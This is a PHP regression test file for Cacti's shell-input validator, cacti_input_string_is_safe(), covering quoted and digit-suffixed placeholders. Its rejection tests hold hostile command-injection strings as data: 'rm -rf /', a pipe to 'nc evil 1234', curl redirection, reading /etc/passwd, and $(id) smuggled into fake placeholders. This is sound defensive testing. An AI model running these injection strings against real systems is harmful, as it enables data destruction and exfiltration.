<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2026 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

/*
 * Issue #7121 regression suite for cacti_input_string_is_safe().
 *
 * The GHSA-c4qp-j9r9-fq24 hardening (#7112) extended the blocklist with
 *   ' " < > ( ) { }
 * but the strip pattern (<[a-zA-Z_]+>) still only recognised alphabetic
 * placeholder names and did not consume the surrounding quotes used for
 * shell-arg quoting. Two failure modes resulted:
 *
 *   1. Quoted placeholder: "<reason>" — the strip removed <reason> but
 *      left the literal "" in the residue, which then matched the new
 *      blocklist entry for ".
 *   2. Digit-suffixed placeholder: <arg1>, <host_id2> — the strip's
 *      [a-zA-Z_]+ refused to match arg1, leaving stray <> in the residue
 *      which then matched the new blocklist entries for < and >.
 *
 * Both broke the GUI save path (data_input.php) and the XML/package
 * import path (lib/import.php). The downstream effect: data input
 * methods could not be saved or imported, data templates could not bind
 * to them, and poller_cache and data_local stayed empty for the affected
 * data sources.
 *
 * The fix replaces the strip pattern with explicit alternation that
 * accepts paired surrounding quotes and digit-friendly placeholder names:
 *
 *   "<x>" | '<x>' | <x>     where x = [a-zA-Z0-9_]+
 *
 * The placeholder grammar matches the one already used by
 * generate_data_input_field_sequences() and get_full_script_path(), so
 * the validator no longer disagrees with the rest of Cacti about what
 * counts as a placeholder. The blocklist is unchanged, so the
 * GHSA-c4qp-j9r9-fq24 protection holds.
 */

$functionsSource = file_get_contents(__DIR__ . '/../../lib/functions.php');

/**
 * Extract cacti_input_string_is_safe() from lib/functions.php into a
 * uniquely-named local copy so the test does not depend on the full
 * Cacti bootstrap (which other unit tests in this directory also avoid).
 */
function _extract_input_string_validator(string $functionsSource, string $localName): callable {
	preg_match(
		'/^function cacti_input_string_is_safe\([^)]*\)\s*\{.*?^\}/sm',
		$functionsSource,
		$m
	);
	if (!$m) {
		throw new RuntimeException('cacti_input_string_is_safe() definition not found');
	}
	$src = preg_replace('/^function cacti_input_string_is_safe\(/m', "function {$localName}(", $m[0]);
	if (!function_exists($localName)) {
		// Source-level test pattern: extract the canonical function definition
		// from lib/functions.php so we exercise the real regex without booting
		// the full Cacti runtime. Mirrors SecurityScriptServerDataInputTest.
		eval($src); // nosemgrep: php.lang.security.eval-use.eval-use
	}
	return $localName;
}

$validator = _extract_input_string_validator($functionsSource, '_issue7121_is_safe');

test('issue #7121 ss_grid_preason input_string is accepted', function () use ($validator) {
	/* The exact failing template from #7121 (SMark-Black). The literal
	 * double-quote pair around <reason> is a standard shell-arg quoting
	 * pattern in grid/RTM-style packages. */
	$template = '<path_cacti>/scripts/ss_grid_preason.php ss_grid_preason <clusterid> "<reason>"';
	expect($validator($template))->toBeTrue();
});

test('TheWitness manual repro template is accepted', function () use ($validator) {
	/* Single-arg script template where the user value contains spaces
	 * (e.g. "this is a test"), which forces the placeholder to be wrapped
	 * in shell quotes. Without the fix this rejects, so the data input
	 * method save fails, no data_template_data linkage is created, and
	 * downstream data source / graph template creation finds nothing to
	 * push into poller_item. The cascade matches TheWitness's report:
	 * "no poller item is added" in advanced-mode data source creation. */
	$template = '<path_php_binary> <path_cacti>/scripts/test.php "<param>"';
	expect($validator($template))->toBeTrue();
});

test('digit-suffixed placeholders are accepted', function () use ($validator) {
	/* These shapes appear in many vendor packages where multiple
	 * arguments share a base name (arg1, arg2, host_id1, host_id2). The
	 * pre-fix strip pattern <[a-zA-Z_]+> would not consume them. */
	expect($validator('<path_cacti>/scripts/x.php <arg1>'))->toBeTrue();
	expect($validator('<path_cacti>/scripts/x.php <arg1> <arg2>'))->toBeTrue();
	expect($validator('<path_cacti>/scripts/x.php <host_id1>'))->toBeTrue();
	expect($validator('<path_cacti>/scripts/x.php <host_id1> <host_id2>'))->toBeTrue();
});

test('paired single-quotes around placeholders are accepted', function () use ($validator) {
	expect($validator("<path_cacti>/scripts/x.php '<reason>'"))->toBeTrue();
	expect($validator("<path_php_binary> -q <path_cacti>/scripts/x.php '<arg1>'"))->toBeTrue();
});

test('paired double-quotes around placeholders are accepted', function () use ($validator) {
	expect($validator('<path_cacti>/scripts/x.php "<reason>"'))->toBeTrue();
	expect($validator('<path_php_binary> -q <path_cacti>/scripts/x.php --hostname="<host>" --community="<community>"'))->toBeTrue();
});

test('GHSA-c4qp-j9r9-fq24 bypass payloads are still rejected', function () use ($validator) {
	/* The fix must not regress the security guarantees of #7112. */
	expect($validator("/bin/sh -c 'id > /tmp/out'"))->toBeFalse();
	expect($validator('/usr/bin/curl http://x > /y'))->toBeFalse();
	expect($validator('/bin/sh -c (id)'))->toBeFalse();
	expect($validator("/bin/sh -c 'id'"))->toBeFalse();
	expect($validator('cmd {dangerous}'))->toBeFalse();
	expect($validator('cmd < /etc/passwd'))->toBeFalse();
});

test('classic shell-injection metacharacters are rejected', function () use ($validator) {
	/* Pre-existing blocklist coverage. */
	expect($validator('/bin/foo; rm -rf /'))->toBeFalse();
	expect($validator('/bin/foo && bad'))->toBeFalse();
	expect($validator('/bin/foo `id`'))->toBeFalse();
	expect($validator('/bin/foo $(id)'))->toBeFalse();
	expect($validator('/bin/foo | nc evil 1234'))->toBeFalse();
	expect($validator("template\nwith\nnewline"))->toBeFalse();
	expect($validator("template\rwith\rcr"))->toBeFalse();
});

test('unbalanced quotes outside placeholders are rejected', function () use ($validator) {
	/* The strip pattern only consumes paired quotes that wrap a
	 * placeholder. A stray quote anywhere else surfaces in the residue
	 * and trips the blocklist. */
	expect($validator('<path_cacti>/scripts/x.php "<host\' "<host>"'))->toBeFalse();
	expect($validator('<path_cacti>/scripts/x.php "no closing quote'))->toBeFalse();
});

test('fake placeholders containing metacharacters are rejected', function () use ($validator) {
	/* <;rm -rf /;> does not match the placeholder syntax, so the residue
	 * still contains the raw shell metacharacters. */
	expect($validator('<path_cacti>/scripts/x.php <;rm -rf /;>'))->toBeFalse();
	expect($validator('<path_cacti>/scripts/x.php <$(id)>'))->toBeFalse();
});

test('empty and null inputs are accepted', function () use ($validator) {
	expect($validator(''))->toBeTrue();
	expect($validator(null))->toBeTrue();
});
